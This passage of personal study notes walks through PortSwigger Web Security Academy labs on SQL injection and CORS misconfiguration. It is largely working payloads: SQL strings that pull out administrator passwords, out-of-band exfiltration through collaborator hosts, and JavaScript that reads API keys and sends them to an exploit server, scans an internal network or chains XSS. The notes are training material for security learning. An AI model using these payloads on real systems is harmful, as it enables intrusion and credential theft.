        ' UNION select 'a', 'a'--
        -> both columns accept type text
        3. Version of the database
        ' UNION SELECT @@version, NULL-- -> not Microsoft
        ' UNION SELECT version(), NULL-- -> 200 OK
        PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1)
        4. Output the list of table names in the database
        
        ' UNION SELECT table_name, NULL FROM information_schema.tables--
        
        users_xacgsm
        
        1. Output the column names of the table
        
        ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm'--
        
        username_pxqwui
        password_bfvoxs
        
        1. Output the usernames and passwords
        
        ' UNION select username_pxqwui, password_bfvoxs from users_xacgsm--
        
        administrator
        9g91jpytvv5c091xpjxc
        
    - SQL injection attack, listing the database contents on Oracle
        
        when u print table names, try to stay away from things like “APP_USERS_AND_ROLES” that looks like they are built-in tables in oracle
        
        1. Output the list of tables in the database
        
        ' UNION SELECT table_name, NULL FROM all_tables--
        
        USERS_JYPOMG
        
        1. Output the column names of the users table
        
        ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JYPOMG'--
        
        USERNAME_LDANZP
        PASSWORD_DYZWEQ
        
        1. Output the list of usernames/passwords
        
        ' UNION select USERNAME_LDANZP, PASSWORD_DYZWEQ from USERS_JYPOMG--
        
        administrator
        c30j8bn7ejg50isvbiie
        
    - Blind SQL injection with conditional responses
        - python code link
        
        Default behavior is having a “welcome back” message
        
        if we insert the payload `z2g36P5YGulMsGQa' and 1=2—` we don’t get the welcome
        
        To confirm that the table “users exists, we use the payload : `' and (select 'x' from users LIMIT 1)='x'--`
        
        To confirm that the username “administrator” exists : 
        
        `' and (select username from users where username='administrator')='administrator'—`
        
        To get length of the password,  use burp intruder to fuzz the length in the following request : 
        
        `' and (select username from users where username='administrator' and length(password)=20)='administrator'—`
        
        To get the password value, we use :
        
        - the `substring` function
            
            substing (4,10) va retourner  le contenu de la chaine  à partir du 4ème caractère sur 10 caractères.
            
             substring(position,number of chars)
            
            [https://sql.sh/fonctions/substring](https://sql.sh/fonctions/substring)
            
        - the following payload :
        
        `' and (select substring(password,1,1) from users where username='administrator')='a'--’`
        
        `' and (select substring(password,2,1) from users where username='administrator')='a'--’`
        
         Fuzz the letter of the first position to make sure the payload is correct using :
        
         Burp intruder > sniper >Brute forcer with ‘Min length’ =‘Max length’ =1
        
        Next, Fuzz the password with ‘Burp Intruder’ > Cluster bomb :
        
        1.  payload 1 > Numbers > Sequential ( use length)
        2.  payload 2 > Brute forcer with ‘Min length’ =‘Max length’ =1   (dont remove numbers, keep all alphanumeric characters)
        
        when intruder finishes > Filter by search term > “welcome” ( string that shows true) > click on “payload 1” for order and voilaa :
        
        ```
        Lab 11 - Blind SQL injection with conditional responses
        
        Vulnerable parameter - tracking cookie
        
        End Goals:
        1) Enumerate the password of the administrator
        2) Log in as the administrator user
        
        Analysis:
        
        1) Confirm that the parameter is vulnerable to blind SQLi
        
        select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'
        
        -> If this tracking id exists -> query returns value -> Welcome back message
        -> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message
        
        select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'
        -> TRUE -> Welcome back
        
        select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'
        -> FALSE -> no Welcome back
        
        2) Confirm that we have a users table
        
        select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
        -> users table exists in the database.
        
        3) Confirm that username administrator exists users table
        
        select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
        -> administrator user exists
        
        4) Enumerate the password of the administrator user
        
        select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
        -> password is exactly 20 characters
        
        select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'
        
        1 2 3 45 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
        52rqbjtjpa749cy0bv6s
        
        script.py url
        ```
        
    - Blind SQL injection with conditional errors
        
        The results of the SQL query are not returned, and the application does not respond any differently based on **whether the query returns any rows.** If the SQL query **causes an error,** then the application returns a custom error message.
        
        Check **Cheatsheet** to know how to trigger a database error if the condition is true in each database type
        
        ————————
        
        the first step is to try to do concatenation (check cheatsheet)  with : 
        
        `' || (select '' ) || '`
        
        if that dosent work, then the database is probably oracle so try : 
        
        `' || (select '' from dual) || '`
        
        In our case, it’s oracle and instead of ‘LIMIT 1’ we can do : 
        
        - Rownum in oracle
        
        so to confirm that a table exists : 
        
        `' || (select '' from users where rownum =1) || '`
        
        In order to figure out if  smt is True or false, we use this : 
        
        `' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '`
        
        500 status code ⇒ it’s TRUE 
        
        - why ?
            
            SQL Queries execute the FROM clause before the SELECT clause
            
            If the FROM part is True, then the select part is executed
            
            Thereby, if the “administrator” user dosent exist, the SELECT wont be performed
            
            If it exists, the SELECT part will be executed, so we ll get to `TO_CHAR(1/0)` (which  convert the result of 1/0 to a char ) which is always False
            
        
        To find password length, we bruteforce with intruder and filter with status code   : 
        
        `' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)=1) || ‘`
        
        To find password : 
        
        `' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a' )|| ‘`
        
        ```
        Lab #12 - Blind SQL injection with conditional errors
        
        Vulnerable parameter - tracking cookie
        
        End Goals:
        - Output the administrator password
        - Login as the administrator user
        
        Analysis:
        
        1) Prove that parameter is vulnerable
        
        ' || (select '' from dual) || ' -> oracle database
        
        ' || (select '' from dualfiewjfow) || ' -> error
        
        2) Confirm that the users table exists in the database
        
        ' || (select '' from users where rownum =1) || '
        -> users table exists
        
        3) Confirm that the administrator user exists in the users table
        ' || (select '' from users where username='administrator') || '
        
        ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
        
        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
        -> Internal server error -> administrator user exists
        
        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || '
        -> 200 response -> user does not exist in database
        
        4) Determine length of password
        
        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || '
        -> 200 response at 50 -> length of password is less than 50
        -> 20 characters
        
        5) Output the administrator password
        
        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || '
        -> w is not the first character of the password
        
        wjuc497wl6szhbtf0cbf
        
        script.py <url>
        ```
        
    - Blind SQL injection with time delays
        
        u should do concatenation and use a function triggering a time delay from the cheatsheet
        
        u should try all databases types
        
        if u use SELECT, u should put in () like
        
        - Right payload is :
        
        `'|| (SELECT pg_sleep(10))—`
        
        `x'||pg_sleep(10)--`
        
        - Not tested but the possible payloads i guess are these 4:
        
        Oracle :
        '|| dbms_pipe.receive_message(('a'),10)--
        
        Microsoft :
        '+WAITFOR DELAY '0:0:10'--
        mysql :
        ' || (SELECT sleep(10))-- -
        postgresql :
        '|| pg_sleep(10)--
        
        - Rana’s notes :
        
        ```
        Lab #13 - Blind SQL Injection with time delays
        
        Vulnerable parameter - tracking cookie
        
        End Goal:
        - to prove that the field is vulnerable to blind SQLi (time based)
        
        Analysis:
        
        select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';
        
        ' || (SELECT sleep(10))-- -x
        ' || (SELECT pg_sleep(10))--
        
        ```
        
    - Blind SQL injection with time delays and information retrieval
        - Check cheat sheet to see which payload will trigger time delay > u find database type > u use **Conditional time delays** payload associated with that type**.**
        - In intruder :
        Before the attack : use a ressource pool with only one 1 max conccurent request !!!!
        After the attack :  filter using : columns > response received
        - change the sleep period to 5, since it will take longer to test with 10
        - highlight found items and choose in burp filter : only show highlighted items
        
        Both Rana and my sql queries work, rana’s ones are shorter :
        
        ```
        Lab #14 - Blind SQLi with time delays and informational retrieval
        
        Vulnerable parameter - tracking cookie
        
        End Goals:
        - Exploit time-based blind SQLi to output the administrator password
        - Login as the administrator user
        
        Analysis:
        
        1) Confirm that the parameter is vulnerable to SQLi
        
        ' || pg_sleep(10)--
        
        2) Confirm that the users table exists in the database
        
        ' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
        
        ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
        
        3) Enumerate the password length
        
        ' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
        -> length of password is 20 characters
        
        4) Enumerate the administrator password
        
        ' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
        
        13ipnob7l2dkjp3drryy
        ```
        
        my queries  : 
        
        - Trigger a sleep when a valid condition like 1=1 is used, this only works in postgresql ! :
        
        `'|| (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)—`
        
        - Confirm that the users table exists in the database and there is an ‘administrator’ user :
        
        `'|| (SELECT CASE WHEN (select username from users where username='administrator')='administrator' THEN pg_sleep(10) ELSE pg_sleep(0) END)—`
        
        - find password length :
        
        `'|| (SELECT CASE WHEN (select length(password) from users where username='administrator')=20 THEN pg_sleep(10) ELSE pg_sleep(0) END)—`
        
        - find administrator’s password :
        
        `'|| (SELECT CASE WHEN (select substring(password,1,1) from users where username='administrator')='a' THEN pg_sleep(10) ELSE pg_sleep(0) END)—`
        
    - Blind SQL injection with out-of-band interaction
        
        we followed cheatsheet and got lucky with first  type of database (oracle)
        
        dont forget to put your select like this `‘ || (selct ...)—`
        
        the right payload is : 
        
        `' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--`
        
    - Blind SQL injection with out of band data exfiltration
        
        simply used cheatsheet, the information u want get sent as subdomain : 
        
        `' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)—`
        
    - Visible error-based SQL injection
        - lab link
            
            [https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
            
        - they tell us in the lab that the injection is in cookie. it’s `TrackingId` cookie
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2033.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2034.png)
            
        - to confirm that this a blind sql injection, we use a random value in the cookie and get the same response
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2035.png)
            
        - we will try to get the error message to output the password of administrator
        - One way of achieving this is to use the `CAST()` function, which enables you to convert one data type to another.
        - the idea is to trigger an error by casting a string to another type and the backend will leak the data in the error
        - let’s start with the payload `WZpzLlpH0U2PHGjn' AND CAST((select 1) AS int)—` we’ll get the following error, this doesn’t work because we should use a boolean value with AND
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2036.png)
            
        - but if we use `pWZpzLlpH0U2PHGjn' AND 1=CAST((select 1) AS int)—` it will work.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2037.png)
            
        - Next, we try to get the admin’s password using the payload p`FNjoVuG3fnTFJ3a' AND 1=CAST ( (select password from users where username='administrator') AS INT )—` but it appears that there is a verification in the backend that checks the length of the cookie
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2038.png)
            
        - so we use this smaller payload `'+AND+1=CAST((select+username+from+users+limit+1)+AS+int)—` to check that the first username in the users table is `administrator`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2039.png)
            
        - Finally, we use the payload `'+AND+1=CAST((select+password+from+users+limit+1)+AS+int)—` to get administrator’s password
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2040.png)
            
        - 
    - SQL injection with filter bypass via XML encoding
        - lab link
            
            [https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
            
        - in the description they mention that the sql injection is in the stock check feature
        - after trying the classic payloads, it looks like all the special characters and keywords are blocklisted
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2041.png)
            
        - Not important here but remember that you can’t use some characters like single quotes in xml.
        - in order to bypass the blocklist, we can use the Unicode representation for a character in those keywords
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2042.png)
            
        - to know the representation of a specific character, i used chatgpt and adapted it to the form `&#x4F;`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2043.png)
            
        - For example for the payload `1 order by 1—` we can use `1 &#x4F;RDER BY 1 -&#x2D;` ( we encoded `o` and `-` )
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2044.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2045.png)
            
        - this time we’ll extact the password by encoding the first character in the keywords of the payload  `0 UNION Select password from users—`
            
            ```jsx
            0 &#x55;NION &#x53;elect password from users-&#x2D;
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2046.png)
            
        - using the first password we can login as administrator and solve the lab
        - Looking at the solution done by Rana, we can use the extension “Hackvector’ to do the encoding
            - On one hand, when this extension is activated ‣ and it finds its tags which are identified by the use of `@` it will convert the text inside the tags to the desired encoding
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2047.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2048.png)
                
            - On the other hand, it also provides a tab in burpsuite where we can convert the payload directly and then copy it
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2049.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2050.png)
                
    
    Cheatsheet :
    
    [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
    
- CORS
    - CORS vulnerability with basic origin reflection
        1. u should find the exact endpoint that prints the private resource which is “/accountDetails” in this case
        2. check “credentials:true” header in the response
        3. In the right endpoint, check if it’s vulnerable by inserting a random value in the origin header in the request, and check if it’s reflected in the response
        4. if u wanna test in [localhost](http://localhost), go to html exploit script and open web server  
        
        the code : 
        
        `<html>
        <body>
        <h1>Hello World!</h1>
        <script>
        var xhr = new XMLHttpRequest();
        var url = "[https://ace71f3f1f3a0686c15a582e002b0027.web-security-academy.net/accountDetails](https://ace71f3f1f3a0686c15a582e002b0027.web-security-academy.net/accountDetails)"
        xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE){
        fetch("/log?key=" + xhr.responseText)
        }
        }
        xhr.open('GET', url, true);
        xhr.withCredentials = true;
        xhr.send(null)
        </script>
        </body>
        </html>`
        
    - CORS vulnerability with trusted null origin
        - we check if it’s vulnerable to dynamic  relection ( no ACAO header, or pointing to a specific origin) then to null origin the header is “Origin: null”, no speces between before ‘:’ !!
        - **CORS blocks access when** there is no ACAO header, or pointing to a specific origin !!
        - deploy the web server first in ur local server and access it with http://localhost/cors-null.html
        - also check /tools
        - soluion :
        
        `<html>
        <body>
        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
        var xhr = new XMLHttpRequest();
        var url = '[https://ac2e1f5b1f4defd2c063036e008a00aa.web-security-academy.net/accountDetails](https://ac2e1f5b1f4defd2c063036e008a00aa.web-security-academy.net/accountDetails)'
        xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch('/log?key=' + xhr.responseText)
        }
        }
        xhr.open('GET', url, true);
        xhr.withCredentials = true;
        xhr.send(null);
        </script>"></iframe>
        </body>
        </html>`
        
        [](https://raw.githubusercontent.com/rkhal101/Web-Security-Academy-Series/main/cors/lab-02/cors-lab-02.html)
        
    - CORS vulnerability with trusted insecure protocols
        - if u don’t see the ACAO reflected, means CORS test fails
        - using the origin “https://a.[acd61fcd1fb3c003c01491ba008500d3.web-security-academy.net](http://acd61fcd1fb3c003c01491ba008500d3.web-security-academy.net/)” works, or any subdomain
        - the use of http in subdomains is also supported
        - this means if there is an xss in any subdomain, they can use cors script as a payload to get the user’s API key (
        - when u do `<img src=”http://someApp/somePage”  />` it will do a GET request to someApp but it wont execute the javascript in somePage
        - if u want to execute the JS in somePage, u should use a redirection to that page using `document.location`
        - fetch replacing XHR
            
            [API Fetch - Référence Web API | MDN](https://developer.mozilla.org/fr/docs/Web/API/Fetch_API)
            
            [Fetch API, XMLHTTPRequest replacement](https://www.youtube.com/watch?v=Vj7W8pI-L6w)
            
        - Steps :
            1. make sure that if u change origin with a subdomain it will work
            2. login to the app
            3. find a subdomain of the app, in our case it ‘s “stock.aaaaa” (in the feature View Details > Check Stock) 
            4. found an xss in that subdomain, easy to find cuz it was in an http parameter used to check stock
                
                [https://stock.ac7c1fa01eab4bbcc0a02620005f0045.web-security-academy.net/?productId=](https://stock.ac7c1fa01eab4bbcc0a02620005f0045.web-security-academy.net/?productId=)<script>alert() <%2fscript>&storeId=1
                
            5. replace the value with the parameter with a CORS script  that get API Key and sends it to [localhost](http://localhost) (for testing purposes ), the script should be url encoded and u should only single quote inside a script to  put everything inside double quote or vise-versa
                
                `<script>
                var xhr = new XMLHttpRequest();
                var url = "[https://ac1c1f291fd60c8bc036aa6f00a6000f.web-security-academy.net/accountDetails](https://ac1c1f291fd60c8bc036aa6f00a6000f.web-security-academy.net/accountDetails)"
                xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                fetch([http://localhost/log?key=](http://localhost/log?key=)" + xhr.responseText)
                }
                }
                xhr.open("GET", url, true);
                xhr.withCredentials = true;
                xhr.send(null)
                </script>`
                
            6. we end up with a url like ( we should be getting the Api Key of weiner in our local server) : 
                
                ```xml
                https://stock.ac7c1fa01eab4bbcc0a02620005f0045.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%22%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%75%72%6c%20%3d%20%22%68%74%74%70%73%3a%2f%2f%61%63%37%63%31%66%61%30%31%65%61%62%34%62%62%63%63%30%61%30%32%36%32%30%30%30%35%66%30%30%34%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%78%68%72%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%78%68%72%2e%72%65%61%64%79%53%74%61%74%65%20%3d%3d%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%2e%44%4f%4e%45%29%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%6c%6f%67%3f%6b%65%79%3d%22%20%2b%20%78%68%72%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%47%45%54%22%2c%20%75%72%6c%2c%20%74%72%75%65%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%78%68%72%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%6e%75%6c%6c%29%0a%20%20%20%20%20%20%20%20%3c%2f%73%63%72%69%70%74%3e&storeId=1
                ```
                
            7. so the url that we will send to the victim will be like : 
                
                `<script>document.location=”http://stock........” </script>`
                
            8. Now that we tested, we change [localhost](http://localhost) with exploit and  we repeat the steps  to generate the right payload : 
                
                `<script>
                document.location=""
                var xhr = new XMLHttpRequest();
                var url = "[https://ac7c1fa01eab4bbcc0a02620005f0045.web-security-academy.net/accountDetails](https://ac7c1fa01eab4bbcc0a02620005f0045.web-security-academy.net/accountDetails)"
                xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                fetch("[https://exploit-ace71fe11ed84bc6c0af263e01430085.web-security-academy.net/log?key=](https://exploit-ace71fe11ed84bc6c0af263e01430085.web-security-academy.net/log?key=)" + xhr.responseText)
                }
                }
                xhr.open("GET", url, true);
                xhr.withCredentials = true;
                xhr.send(null)
                </script>`
                
                ```xml
                <script>document.location="https://stock.ac7c1fa01eab4bbcc0a02620005f0045.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%22%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%75%72%6c%20%3d%20%22%68%74%74%70%73%3a%2f%2f%61%63%37%63%31%66%61%30%31%65%61%62%34%62%62%63%63%30%61%30%32%36%32%30%30%30%35%66%30%30%34%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%78%68%72%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%78%68%72%2e%72%65%61%64%79%53%74%61%74%65%20%3d%3d%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%2e%44%4f%4e%45%29%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%6c%6f%67%3f%6b%65%79%3d%22%20%2b%20%78%68%72%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%47%45%54%22%2c%20%75%72%6c%2c%20%74%72%75%65%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%78%68%72%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%6e%75%6c%6c%29%0a%20%20%20%20%20%20%20%20%3c%2f%73%63%72%69%70%74%3e&storeId=1"</script>
                ```
                
        
    - CORS vulnerability with internal network pivot attack (expert level)
        - to get html content, we ll be using encodeURIComponent()
            
            [JavaScript encodeURIComponent()](https://www.w3schools.com/jsref/jsref_encodeuricomponent.asp)
            
        
        Target Goals:
        
        - Use JS to locate an endpoint on the local network (192.168.0.0/24 port 8080)
        - Exploit CORS misconfiguration to delete user Carlos.
        - Step 1 : Use JS to locate an endpoint on the local network
            - step 1 using XHR
                - Get the right IP, containning the vulnerable app
                    
                    ```jsx
                    <html>
                        <body>
                            <h1>Hello World!</h1>
                            <script>
                                for (let i = 1; i < 255; i++) {      
                                try{
                    
                                    var xhr = new XMLHttpRequest();
                                    var url = "http://192.168.0."+i+":8080";
                                    xhr.onreadystatechange = function() {
                                        if (xhr.readyState == XMLHttpRequest.DONE){
                                            
                                            fetch("http://exploit-acca1f491f276bd2c07a10e6019700e6.web-security-academy.net/log?key"+i+"="+ encodeURIComponent(xhr.responseText));
                           
                            }}
                    
                                 xhr.open('GET', url, true);
                                xhr.send(null);
                                    }
                                catch(e) {
                            }}
                                
                            </script>
                        </body>
                    </html>
                    ```
                    
                - Get the html content of the app
                    
                    ```jsx
                    <html>
                        <body>
                            <h1>Hello World!</h1>
                            <script>
                                var xhr = new XMLHttpRequest();
                                xhr.onreadystatechange = function() {
                                    if (xhr.readyState == XMLHttpRequest.DONE){
                                        fetch("http://exploit-acca1f491f276bd2c07a10e6019700e6.web-security-academy.net/" + 
                                        "/log?key=" + encodeURIComponent(xhr.responseText))
                                    }
                                }
                    
                                xhr.open('GET', "http://192.168.0.180:8080", true);
                                //xhr.withCredentials = true;
                                xhr.send(null)
                            </script>
                        </body>
                    </html>
                    ```
                    
            - step 1 using fetch ( best approach)
                
                ```jsx
                <html>
                  <body>
                    <script>
                      Array.from(Array(256).keys()).forEach((i) => {
                        fetch("http://192.168.0." + i + ":8080")
                          .then((response) => {
                            response.text().then(function (text) {
                              if (text && typeof text === "string") {
                                fetch("/"+i+"[RESPONSE]" + JSON.stringify(text)).then(console.log);
                              }
                            });
                          })
                          .catch((error) => {});
                      });
                    </script>
                  </body>
                </html>
                ```
                
            - we find a login page that looks like the one we have, in order to access or read authenticated pages  we must exploit have the app’s origin, which can happen if we find an xss
        - Step 2 : Try to find an XSS vulnerability in the login page
            - we are supposed to try many xss vectors in case of blacklists and in different parameters like the password in this case, but things here are easy and we find an xss in the username
            - we can confirm an xss in an app that we don’t access by using img html tag and checking if a  request  will be made to the collobarotor server (since a reflected xss  arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way, so no js needed for an xss like the payload that change font to bold)
            - in order to inject or fuzz and not be blocked,  we should have a valid csrf parameter value, which is possible by extracting it using a regex,( (since we have the page code from the previous step )
            - we will use the following regex to get the value of the csrf parameter
                
                csrf" value="([^"]+)”
                
            - code
                
                ```jsx
                <html>
                  <body>
                    <script>
                    collaboratorURL="http://lpe4kd0ni8zig1u2v9vjpohlrcxalz.burpcollaborator.net"
                    url="http://192.168.0.15:8080"
                
                  	fetch(url)
                    .then(response => response.text())
                    .then(text =>{
                    	try{
                    		xss_vector='"><img src='+collaboratorURL+'?foundXSS=1>';
                    		login_path='/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
                    		location=url+login_path;
                    	} catch(err){
                
                    	}
                    })
                    </script>
                  </body>
                </html>
                ```
                
            - expected output
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2051.png)
                
        - Step 3 : Use the XSS vulnerability in order to access an authenticated page.
            - since we have an xss, there will be no CORS restriction, so like lab 3 we will inject a script in the vulnerable parameter
            - since in the prevous labs we deleted the user carlos by accesing the admin page, our script will try to get the content of /admin page and send it to collaborator
            - in order to do that we will use an iframe
                1. the iframe will load the admin page
                2.  then send the html content of that window (that iframe ) to collaborator using ‘onload’
                - the iframe code will be quivalent to this line :
                
                ```jsx
                <iframe src=/admin onload="new Image().src='http://lpe4kd0ni8zig1u2v9vjpohlrcxalz.burpcollaborator.net?code='+encodeURIComponent(this.contentWindow.document.body.innerHTML) ">';
                ```
                
                - This syntax in JS is correct and  it’s possible to use `new Image().src=’a’+’b’` and it will be equivalent to `new Image().src=“ab”`,  u can always try this code locally and  try to get the html content of an iframe in your http server
            - Code
                
                ```jsx
                <html>
                  <body>
                    <script>
                    collaboratorURL="http://ds9ogc1nb3fj800ffy0co0bhq8wzko.burpcollaborator.net"
                    url="http://192.168.0.109:8080"
                
                  	fetch(url)
                    .then(response => response.text())
                    .then(text =>{
                    	try{
